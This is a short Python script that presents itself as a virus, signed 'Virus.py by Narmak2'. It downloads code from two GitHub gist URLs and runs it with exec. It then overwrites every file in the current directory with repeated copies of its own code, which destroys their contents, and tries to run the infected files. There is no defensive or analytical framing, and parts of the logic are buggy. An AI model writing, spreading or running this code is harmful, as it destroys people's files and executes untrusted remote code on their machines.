# VIRUS SAYS HI!
import sys
import glob
import os
import urllib.request
#sig = 'Virus.py by Narmak2'
ff = sys.argv[0]
virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break
if 'sig = \'Virus.py by Narmak2\'' in lines:
  fp = urllib.request.urlopen("https://gist.githubusercontent.com/NarmakTwo/45ba9e421fdeb87ee3bb1a265d85f3e2/raw/62bfae6a810ecd6d3c9cb31bb961dfba489b86de/code.py")
  mybytes = fp.read()
  mystr = mybytes.decode("utf8")
  fp.close()
  exec(compile(mystr, 'exec', 'exec'))
else:
  fp = urllib.request.urlopen("https://gist.githubusercontent.com/NarmakTwo/b6ce28a66fe6af224c2fadba10efdf7c/raw/b363584b8dfb4168f636f6837d2d112f56770fb7/gistfile1.txt")
  mybytes = fp.read()
  mystr = mybytes.decode("utf8")
  fp.close()
  exec(compile(mystr, 'exec', 'exec'))
python_files = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*')
for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected = False
    final_code = []
    final_code.extend(virus_code)
    final_code.extend('\n')
    with open(file, 'w') as f:
      for i in range(20):
        f.writelines(final_code)
for i in python_files:
  os.system(f'python3 {os.path.abspath(file)} $')
# VIRUS SAYS BYE!
